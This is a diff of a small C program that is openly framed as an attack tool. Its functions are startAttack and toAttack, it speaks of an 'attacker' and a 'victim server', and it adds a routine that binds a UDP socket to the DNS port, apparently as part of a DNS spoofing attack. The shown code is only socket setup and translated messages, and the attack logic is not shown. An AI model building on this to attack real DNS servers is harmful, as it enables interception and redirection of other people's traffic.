@@ -12,10 +12,10 @@ int main()
 
 void startAttack()
 {
-	pthread_t a[2];
-	int *listen, *send;
 	sck = socket(AF_INET, SOCK_DGRAM, 0);	
 	checkSocket();
+	bindPort();
+
 	toAttack();
 }
 
@@ -23,16 +23,30 @@ void checkSocket()
 {
 	if(sck == -1)
 	{
-		printf("Houve problema ao criar socket\n");
+		printf("There was a problem creating the socket\n");
 		exit(1);
 	}
 	else
-		printf("Socket criado com sucesso!\n");
+		printf("Socket was created successfully!\n");
+}
+
+void bindPort()
+{
+	attacker.sin_family = AF_INET; 
+	attacker.sin_port = htons(_DNS_PORT);
+	memset(attacker.sin_zero, 0x0, 8);	
+	
+	if (bind(sck, (struct sockaddr *) &attacker, sizeof(attacker)) == -1 )
+	{	
+		printf("There was a problem opening the port...\n");
+		exit(1);
+	}
+	else
+		printf("Port %d was opened successfully! Listening...\n", _VICTIM_PORT);
 }
 
 void toAttack()
 {
-	int buffer_size;
 	char buffer[_LEN];
 
 	// ---- victim server
